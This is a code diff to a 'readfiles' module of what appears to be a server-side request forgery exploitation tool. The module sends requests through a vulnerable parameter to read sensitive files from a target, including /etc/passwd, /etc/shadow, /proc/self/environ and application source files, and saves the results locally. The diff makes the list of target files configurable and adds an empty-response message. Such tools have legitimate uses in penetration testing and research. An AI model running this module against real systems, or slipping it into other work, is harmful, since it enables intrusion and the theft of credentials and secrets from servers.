@@ -1,6 +1,10 @@
 from core.utils import *
 import logging
 import os
+from argparse import ArgumentParser
+
+#parser.add_argument("-f", "--file", dest="filename",
+#                    help="write report to FILE", metavar="FILE")
 
 name          = "readfiles"
 description   = "Read files from the target"
@@ -8,12 +12,13 @@ author        = "Swissky"
 documentation = []
 
 class exploit():
-    files = ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]
-
+    
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
-
+        self.files = args.targetfiles.split(',') if args.targetfiles != None else ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]   
+        
         r = requester.do_request(args.param, "")
+        
         if r != None:
             default = r.text
 
@@ -36,3 +41,6 @@ class exploit():
                     logging.info("\033[32mWriting file\033[0m : {} to {}".format(f, directory + "/" + filename))
                     with open(directory + "/" + filename, 'w') as f:
                         f.write(diff)
+
+        else:
+            print("Empty response")
